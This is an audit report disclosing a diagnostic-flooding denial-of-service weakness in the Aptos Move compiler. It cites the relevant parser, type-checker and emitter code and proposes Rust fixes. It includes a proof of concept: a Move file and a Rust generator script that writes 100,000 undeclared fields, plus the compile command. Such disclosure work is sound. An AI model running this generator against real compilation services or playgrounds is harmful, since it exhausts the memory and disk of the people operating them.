# Audit Report

## Title
Diagnostic Flooding Denial of Service via Unbounded Undeclared Field Errors in Move Compiler

## Summary
The Move compiler lacks limits on the number of diagnostics that can be generated during compilation. An attacker can create malicious Move source code with a struct pack expression containing millions of undeclared fields, causing the compiler to generate and emit millions of unique diagnostic messages. This leads to memory exhaustion, disk space consumption, and potential crashes of log aggregation systems.

## Finding Description
The vulnerability exists across multiple stages of the Move compiler pipeline:

**1. Parsing Phase - No Field Count Limit:**
The parser accepts struct pack expressions with an unbounded number of fields. The `parse_comma_list_after_start` function iterates indefinitely until encountering the closing brace, with no limit on iterations. [1](#0-0) 

When parsing a struct pack expression like `MyStruct { field1: 1, field2: 2, ..., fieldN: N }`, the parser will accept any number of fields N without restriction. [2](#0-1) 

**2. Type Checking Phase - Unbounded Error Generation:**
During type checking, the `check_missing_or_undeclared_fields` function iterates through all fields provided in the pack expression. For each field that doesn't exist in the struct definition, it calls `self.error()` to add a diagnostic. Critically, each diagnostic is unique (different field name and location), bypassing deduplication. [3](#0-2) 

**3. Diagnostic Storage - Unbounded Vector:**
Diagnostics are stored in an unbounded `Vec<(Diagnostic, bool)>` with no size limit. [4](#0-3) 

**4. Deduplication - Ineffective for Unique Errors:**
The deduplication mechanism only prevents showing the same diagnostic twice based on its Debug representation. Since each undeclared field error has a different field name and source location, all diagnostics are considered unique and pass through. [5](#0-4) 

**5. Emission Phase - Unbounded Output:**
When `check_errors()` is called, it triggers `report_diag` which iterates through ALL diagnostics and calls `emit()` for each one. The `emit()` function in `json.rs` writes each diagnostic to the output writer without any rate limiting or size checks. [6](#0-5) [7](#0-6) 

**Attack Scenario:**
An attacker creates a Move file like:
```move
module 0x1::attack {
    struct S has drop { x: u64 }
    
    fun exploit() {
        let _ = S {
            field1: 1, field2: 2, field3: 3, /* ... 1 million more undeclared fields ... */
        };
    }
}
```

Each undeclared field generates a unique error message. With 1 million fields, this produces 1 million diagnostics, each potentially several hundred bytes when serialized as JSON.

## Impact Explanation
This vulnerability qualifies as **High Severity** per the Aptos bug bounty criteria:

**Validator node slowdowns:** If compilation occurs on validator nodes (e.g., when deploying modules), the excessive memory consumption and disk I/O can slow down the node significantly.

**API crashes:** Compilation services with memory or disk limits will crash when processing malicious code. The unbounded diagnostic vector can consume all available memory.

**Significant protocol violations:** This breaks the documented invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits." The compiler performs unbounded memory allocation and disk writes without any resource controls.

**Concrete Impact:**
- Memory exhaustion: 1 million diagnostics × ~500 bytes each = ~500 MB minimum
- Disk space consumption: If diagnostics are written to logs, they can fill available disk space
- Log aggregation system crashes: Systems like Splunk, ELK, or CloudWatch can crash or throttle when receiving millions of log entries rapidly
- Denial of service for compilation infrastructure

## Likelihood Explanation
**Likelihood: High**

The attack requires only the ability to submit Move code for compilation, which is a common operation:
- Developers compiling code locally or in CI/CD pipelines
- Web-based Move playgrounds accepting user code
- Node operators compiling user-submitted modules
- Any compilation service exposed via API

The attack is trivial to execute—a simple script can generate a Move file with an arbitrary number of undeclared fields. No special privileges, validator access, or complex setup is required.

The vulnerability is guaranteed to trigger because:
1. No validation checks prevent parsing excessive fields
2. No limit exists on diagnostic count
3. All diagnostics are emitted unconditionally

## Recommendation

Implement multiple defensive layers:

**1. Add field count limit during parsing:**
```rust
const MAX_FIELDS_IN_PACK: usize = 1000;

fn parse_comma_list_after_start<F, R>(
    context: &mut Context,
    // ... parameters ...
) -> Result<Vec<R>, Box<Diagnostic>>
where
    F: Fn(&mut Context) -> Result<R, Box<Diagnostic>>,
{
    // ... existing code ...
    let mut v = vec![];
    loop {
        // ... existing checks ...
        v.push(parse_list_item(context)?);
        
        if v.len() > MAX_FIELDS_IN_PACK {
            return Err(Box::new(diag!(
                Syntax::TooManyFields,
                (loc, format!("Too many fields in expression (max: {})", MAX_FIELDS_IN_PACK))
            )));
        }
        // ... rest of loop ...
    }
}
```

**2. Add diagnostic count limit in GlobalEnv:**
```rust
const MAX_DIAGNOSTICS: usize = 10000;

pub fn add_diag(&self, diag: Diagnostic<FileId>) {
    let mut diags = self.diags.borrow_mut();
    if diags.len() >= MAX_DIAGNOSTICS {
        if diags.len() == MAX_DIAGNOSTICS {
            // Add one final diagnostic warning about suppression
            let warning = Diagnostic::warning()
                .with_message(format!("Diagnostic limit reached ({}). Further diagnostics suppressed.", MAX_DIAGNOSTICS));
            diags.push((warning, false));
        }
        return;
    }
    diags.push((diag, false));
}
```

**3. Add early termination in error iteration:**
```rust
fn check_missing_or_undeclared_fields<T>(
    &mut self,
    struct_name: QualifiedSymbol,
    field_decls: &BTreeMap<Symbol, FieldData>,
    fields: &EA::Fields<T>,
) -> Option<BTreeSet<Symbol>> {
    let mut error_count = 0;
    const MAX_FIELD_ERRORS: usize = 100;
    
    for (name_loc, name, (_, _)) in fields.iter() {
        let field_name = self.symbol_pool().make(name);
        if !self.is_empty_struct(&struct_name) && field_decls.contains_key(&field_name) {
            fields_not_covered.remove(&field_name);
        } else {
            if error_count >= MAX_FIELD_ERRORS {
                self.error(
                    &self.to_loc(&name_loc),
                    &format!("Too many undeclared fields. Showing first {} errors.", MAX_FIELD_ERRORS),
                );
                break;
            }
            self.error(/* ... */);
            error_count += 1;
            succeed = false;
        }
    }
    // ... rest of function ...
}
```

## Proof of Concept

**File: `attack.move`**
```move
module 0x42::diagnostic_flood {
    struct Victim has drop {
        legitimate_field: u64
    }
    
    public fun trigger_flood() {
        // This pack expression contains 10,000 undeclared fields
        // Each will generate a unique diagnostic message
        let _ = Victim {
            fake_001: 1, fake_002: 2, fake_003: 3, fake_004: 4, fake_005: 5,
            fake_006: 6, fake_007: 7, fake_008: 8, fake_009: 9, fake_010: 10,
            // ... repeat pattern 10,000 times ...
            // A script can easily generate this
        };
    }
}
```

**Generator Script (Rust):**
```rust
use std::fs::File;
use std::io::Write;

fn main() {
    let mut file = File::create("attack.move").unwrap();
    writeln!(file, "module 0x42::diagnostic_flood {{").unwrap();
    writeln!(file, "    struct Victim has drop {{ x: u64 }}").unwrap();
    writeln!(file, "    public fun trigger_flood() {{").unwrap();
    writeln!(file, "        let _ = Victim {{").unwrap();
    
    // Generate 100,000 undeclared fields
    for i in 0..100_000 {
        writeln!(file, "            fake_{:06}: {},", i, i).unwrap();
    }
    
    writeln!(file, "        }};").unwrap();
    writeln!(file, "    }}").unwrap();
    writeln!(file, "}}").unwrap();
}
```

**Execution:**
1. Run the generator to create `attack.move`
2. Compile with: `aptos move compile --package-dir . --dev`
3. Observe: Compiler generates 100,000 diagnostics, consuming excessive memory and producing massive output

**Expected Result:** Memory usage spikes to hundreds of MB, compilation takes minutes instead of seconds, and if JSON output is enabled, the output file grows to tens/hundreds of MB.

### Citations

**File:** third_party/move/move-compiler-v2/legacy-move-compiler/src/parser/syntax.rs (L284-329)
```rust
fn parse_comma_list_after_start<F, R>(
    context: &mut Context,
    start_loc: usize,
    start_token: Tok,
    end_token: Tok,
    parse_list_item: F,
    item_description: &str,
) -> Result<Vec<R>, Box<Diagnostic>>
where
    F: Fn(&mut Context) -> Result<R, Box<Diagnostic>>,
{
    adjust_token(context.tokens, end_token);
    if match_token(context.tokens, end_token)? {
        return Ok(vec![]);
    }
    let mut v = vec![];
    loop {
        if context.tokens.peek() == Tok::Comma {
            let current_loc = context.tokens.start_loc();
            let loc = make_loc(context.tokens.file_hash(), current_loc, current_loc);
            return Err(Box::new(diag!(
                Syntax::UnexpectedToken,
                (loc, format!("Expected {}", item_description))
            )));
        }
        v.push(parse_list_item(context)?);
        adjust_token(context.tokens, end_token);
        if match_token(context.tokens, end_token)? {
            break Ok(v);
        }
        if !match_token(context.tokens, Tok::Comma)? {
            let current_loc = context.tokens.start_loc();
            let loc = make_loc(context.tokens.file_hash(), current_loc, current_loc);
            let loc2 = make_loc(context.tokens.file_hash(), start_loc, start_loc);
            return Err(Box::new(diag!(
                Syntax::UnexpectedToken,
                (loc, format!("Expected '{}'", end_token)),
                (loc2, format!("To match this '{}'", start_token)),
            )));
        }
        adjust_token(context.tokens, end_token);
        if match_token(context.tokens, end_token)? {
            break Ok(v);
        }
    }
}
```

**File:** third_party/move/move-compiler-v2/legacy-move-compiler/src/parser/syntax.rs (L1850-1861)
```rust
    match context.tokens.peek() {
        // Pack: "{" Comma<ExpField> "}"
        Tok::LBrace => {
            let fs = parse_comma_list(
                context,
                Tok::LBrace,
                Tok::RBrace,
                parse_exp_field,
                "a field expression",
            )?;
            Ok(Exp_::Pack(n, tys, fs))
        },
```

**File:** third_party/move/move-model/src/builder/exp_builder.rs (L5451-5488)
```rust
    fn check_missing_or_undeclared_fields<T>(
        &mut self,
        struct_name: QualifiedSymbol,
        field_decls: &BTreeMap<Symbol, FieldData>,
        fields: &EA::Fields<T>,
    ) -> Option<BTreeSet<Symbol>> {
        let mut succeed = true;
        let mut fields_not_covered: BTreeSet<Symbol> = BTreeSet::new();
        // Exclude from the covered fields the dummy_field added by legacy compiler
        fields_not_covered.extend(field_decls.keys().filter(|s| {
            if self.is_empty_struct(&struct_name) {
                *s != &self.parent.dummy_field_name()
            } else {
                true
            }
        }));
        for (name_loc, name, (_, _)) in fields.iter() {
            let field_name = self.symbol_pool().make(name);
            if !self.is_empty_struct(&struct_name) && field_decls.contains_key(&field_name) {
                fields_not_covered.remove(&field_name);
            } else {
                self.error(
                    &self.to_loc(&name_loc),
                    &format!(
                        "field `{}` not declared in `{}`",
                        field_name.display(self.symbol_pool()),
                        struct_name.display(self.env())
                    ),
                );
                succeed = false;
            }
        }
        if succeed {
            Some(fields_not_covered)
        } else {
            None
        }
    }
```

**File:** third_party/move/move-model/src/model.rs (L967-970)
```rust
    /// Adds diagnostic to the environment.
    pub fn add_diag(&self, diag: Diagnostic<FileId>) {
        self.diags.borrow_mut().push((diag, false));
    }
```

**File:** third_party/move/move-model/src/model.rs (L1352-1379)
```rust
    pub fn report_diag_with_filter<E, F>(&self, mut emitter: E, mut filter: F)
    where
        E: FnMut(&Files<String>, &Diagnostic<FileId>),
        F: FnMut(&Diagnostic<FileId>) -> bool,
    {
        let mut shown = BTreeSet::new();
        self.diags.borrow_mut().sort_by(|a, b| {
            a.1.cmp(&b.1)
                .then_with(|| GlobalEnv::cmp_diagnostic(&a.0, &b.0))
        });
        for (diag, reported) in self.diags.borrow_mut().iter_mut().filter(|(d, reported)| {
            !reported
                && filter(d)
                && (d.severity >= Severity::Error
                    || d.labels
                        .iter()
                        .any(|label| self.file_id_is_primary_target.contains(&label.file_id)))
        }) {
            if !*reported {
                // Avoid showing the same message twice. This can happen e.g. because of
                // duplication of expressions via schema inclusion.
                if shown.insert(format!("{:?}", diag)) {
                    emitter(&self.source_files, diag);
                }
                *reported = true;
            }
        }
    }
```

**File:** third_party/move/move-compiler-v2/src/diagnostics/json.rs (L22-43)
```rust
    fn emit(&mut self, source_files: &Files<String>, diag: &Diagnostic<FileId>) {
        let fpath_labels = diag
            .labels
            .iter()
            .map(|label| {
                let fpath = codespan_reporting::files::Files::name(source_files, label.file_id)
                    .expect("always Ok() in the impl")
                    .to_string();
                Label::new(label.style, fpath, label.range.clone())
            })
            .collect();
        let mut json_diag = Diagnostic::new(diag.severity)
            .with_message(diag.message.clone())
            .with_labels(fpath_labels)
            .with_notes(diag.notes.clone());
        if let Some(code) = &diag.code {
            json_diag = json_diag.with_code(code)
        }
        serde_json::to_writer(&mut self.writer, &json_diag).expect("it should be serializable");
        writeln!(&mut self.writer)
            .expect("dest is stderr / in-memory buffer, it should always be available");
    }
```

**File:** third_party/move/move-compiler-v2/src/lib.rs (L729-737)
```rust
pub fn check_errors<E>(env: &GlobalEnv, emitter: &mut E, msg: &str) -> anyhow::Result<()>
where
    E: Emitter + ?Sized,
{
    let options = env.get_extension::<Options>().unwrap_or_default();

    emitter.report_diag(env, options.report_severity());
    emitter.check_diag(env, options.report_severity(), msg)
}
```
